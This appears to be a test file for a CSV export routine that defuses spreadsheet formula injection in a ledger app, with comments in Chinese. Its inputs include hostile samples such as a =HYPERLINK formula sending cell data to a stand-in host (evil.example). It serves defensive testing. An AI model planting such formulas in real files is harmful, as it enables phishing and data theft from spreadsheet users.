// MED-2（11-06 QA）：CSV 匯出防公式注入。規則對齊 CRM lib/csv/cell.ts：
// 字串開頭 = + - @ \t \r 前面加 '、字串一律加雙引號；數字金額不動。不需要資料庫。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell, csvRow, ledgerExportCsv } from '../src/lib/csv';

test('=HYPERLINK 釣魚連結被中和：前面加單引號、整格加引號、內部引號跳脫', () => {
  const evil = '=HYPERLINK("https://evil.example/?d="&A1,"點我領獎")';
  assert.equal(csvCell(evil), `"'=HYPERLINK(""https://evil.example/?d=""&A1,""點我領獎"")"`);
});

test('每個危險開頭字元都加單引號（含 \t、\r）；已經有單引號的再多加一個（匯入端對稱拿一個）', () => {
  for (const s of ['=1+1', '+886912345678', '-1+1', '@SUM(A1)', '\tcmd', '\rcmd', "'=x"]) {
    const c = csvCell(s);
    assert.ok(c.startsWith(`"'`), `${JSON.stringify(s)} → ${c}`);
    assert.ok(c.endsWith('"'));
  }
  assert.equal(csvCell("'=x"), `"''=x"`);
  assert.equal(csvCell('\r\n=1'), `"'\r\n=1"`, '\r 開頭也加引號，不會把列切開');
});

test('數字金額不動（不加引號、不加單引號，負數照常加總）；一般文字一律加引號', () => {
  assert.equal(csvCell(120), '120');
  assert.equal(csvCell(-35.5), '-35.5');
  assert.equal(csvCell(Number.NaN), '');
  assert.equal(csvCell('午餐'), '"午餐"');
  assert.equal(csvCell('a,b\nc'), '"a,b\nc"');
  assert.equal(csvCell(null), '""');
  assert.equal(csvRow(['午餐', 120, '=1']), `"午餐",120,"'=1"`);
});

test('記帳簿匯出整份：BOM、表頭、備註裡的公式被中和、金額欄是數字', () => {
  const csv = ledgerExportCsv([
    { paidAt: '2026-10-20T04:00:00.000Z', type: 'EXPENSE', categoryName: '餐飲', accountName: '現金', note: '=HYPERLINK("https://evil.example","x")', amount: 120, memberName: '@Shark', source: 'TEXT' },
  ]);
  assert.ok(csv.startsWith('﻿'));
  const [header, row] = csv.slice(1).split('\r\n');
  assert.equal(header, '"日期","類型","分類","帳戶","備註","金額","記錄者","來源"');
  assert.equal(row, `"2026-10-20","支出","餐飲","現金","'=HYPERLINK(""https://evil.example"",""x"")",120,"'@Shark","TEXT"`);
});
